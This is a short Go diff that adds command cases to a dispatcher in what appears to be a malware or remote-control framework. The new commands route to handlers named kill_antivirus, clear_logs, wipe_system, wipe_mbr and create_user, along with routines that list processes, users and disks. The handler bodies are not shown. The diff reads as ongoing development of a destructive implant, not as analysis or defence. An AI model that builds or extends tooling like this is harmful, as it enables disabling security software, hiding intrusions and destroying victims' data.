@@ -66,6 +66,42 @@ func Parser(function string, value string, s_json string) ([]string, string) {
 	case "elevate":
 		call, s_json = elevate(value, s_json)
 
+	case "create_user":
+		call, s_json = create_user(value, s_json)
+
+	case "kill_process_id":
+		call, s_json = kill_process_id(value, s_json)
+
+	case "kill_process_name":
+		call, s_json = kill_process_name(value, s_json)
+
+	case "kill_antivirus":
+		call, s_json = kill_antivirus(value, s_json)
+
+	case "clear_logs":
+		call, s_json = clear_logs(value, s_json)
+
+	case "wipe_system":
+		call, s_json = wipe_system(value, s_json)
+
+	case "wipe_mbr":
+		call, s_json = wipe_mbr(value, s_json)
+
+	case "get_disks":
+		call, s_json = get_disks(value, s_json)
+
+	case "get_users":
+		call, s_json = get_users(value, s_json)
+
+	case "get_processes":
+		call, s_json = get_processes(value, s_json)
+
+	case "get_processes_name":
+		call, s_json = get_processes_name(value, s_json)
+
+	case "get_processes_pid":
+		call, s_json = get_processes_pid(value, s_json)
+
 	default:
 		notify.Error(fmt.Sprintf("Unknown function '%s'", function), "system.Parser()")
 
